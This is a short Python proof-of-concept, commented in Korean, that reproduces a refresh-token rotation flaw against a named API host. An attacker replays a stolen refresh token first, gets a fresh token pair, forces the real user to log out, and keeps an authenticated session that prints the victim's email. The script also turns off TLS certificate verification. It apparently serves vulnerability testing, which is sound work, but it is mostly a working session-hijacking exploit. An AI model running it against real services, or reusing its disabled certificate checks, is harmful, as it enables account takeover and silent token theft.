import urllib.request
import urllib.error
import json
import ssl

BASE_URL = "https://api.inha-eval.com"

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def post_refresh(token):
    data = json.dumps({"refreshToken": token}).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE_URL}/api/auth/refresh",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=10, context=ssl_ctx) as resp:
        return json.loads(resp.read().decode("utf-8"))

def get_me(access_token):
    req = urllib.request.Request(
        f"{BASE_URL}/api/users/me",
        headers={"Authorization": f"Bearer {access_token}"},
        method="GET"
    )
    with urllib.request.urlopen(req, timeout=10, context=ssl_ctx) as resp:
        return json.loads(resp.read().decode("utf-8"))

if __name__ == "__main__":
    print("=" * 55)
    print("  취약점 3 — Rotation 사각지대 재현")
    print("  공격자가 RT-A를 정상 사용자보다 먼저 사용")
    print("=" * 55)
    rt_a = input("\nRefresh Token (RT-A): ").strip()

    print("\n요청 진행 중...\n")

    # t=1: 공격자 — RT-A 사용 → RT-B 획득
    rt_b = None
    access_token = None
    print("[t=1] 공격자: RT-A로 재발급 요청...")
    try:
        resp = post_refresh(rt_a)
        rt_b = resp.get("refreshToken")
        access_token = resp.get("accessToken")
        print(f"[t=1] 200 OK  → RT-B 발급됨 (공격자 RT-B 획득)")
    except urllib.error.HTTPError as e:
        print(f"[t=1] {e.code} 오류 — RT-A가 이미 사용된 토큰입니다. 새 토큰으로 다시 실행해보세요.")
        exit(1)

    # t=2: 정상 사용자 — RT-A 재사용 시도 → 401
    print("\n[t=2] 정상 사용자: RT-A 재사용 시도...")
    try:
        post_refresh(rt_a)
        print("[t=2] 200 OK  — 예상치 못한 성공 (타이밍 문제)")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(f"[t=2] 401 Unauthorized  → RT-A 이미 삭제됨, 정상 사용자 강제 로그아웃")
        else:
            print(f"[t=2] {e.code} 오류")

    # t=3: 공격자 — RT-B로 인증 → 200
    print("\n[t=3] 공격자: RT-B로 인증 시도...")
    try:
        me = get_me(access_token)
        print(f"[t=3] 200 OK  → 공격자 세션 유지됨")
        print(f"         인증된 사용자: {me.get('email') or me.get('nickname') or me}")
    except urllib.error.HTTPError as e:
        print(f"[t=3] {e.code} 오류")

    print("\n" + "=" * 55)
    print("  결과 요약")
    print("=" * 55)
    print("  t=1: 공격자 RT-A 사용     → RT-B 발급")
    print("  t=2: 정상 사용자 RT-A 재시도 → 401 강제 로그아웃")
    print("  t=3: 공격자 RT-B 인증      → 200 세션 유지")
    print()
    print("  서버는 탈취 사실을 전혀 알지 못한 채")
    print("  공격자가 RT-B로 계속 인증 중")
    print()
    print("  ✓ Rotation 사각지대 재현 성공")
    print("=" * 55)
